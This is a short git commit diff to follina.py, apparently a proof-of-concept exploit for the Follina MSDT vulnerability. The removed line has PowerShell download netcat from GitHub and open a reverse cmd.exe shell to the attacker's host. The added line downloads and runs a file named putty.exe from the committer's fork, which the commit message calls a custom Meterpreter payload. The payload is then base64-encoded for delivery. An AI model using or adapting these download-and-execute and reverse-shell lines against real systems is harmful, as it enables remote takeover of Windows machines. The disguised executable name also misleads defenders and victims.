b92450ce053c3e911ff8a5a58a9395ede04eb037
Amine Ben Hariz <aminebenhariz@gmail.com>
2022-06-27 10:51:15 +0100

    add custom meterpreter payload

--- follina.py
+++ follina.py
@@ -108,7 +108,7 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+        command = f"""Invoke-WebRequest https://github.com/aminebenhariz/msdt-follina/blob/main/putty.exe?raw=true -OutFile C:\\Windows\\Tasks\\putty.exe; C:\\Windows\\Tasks\\putty.exe"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
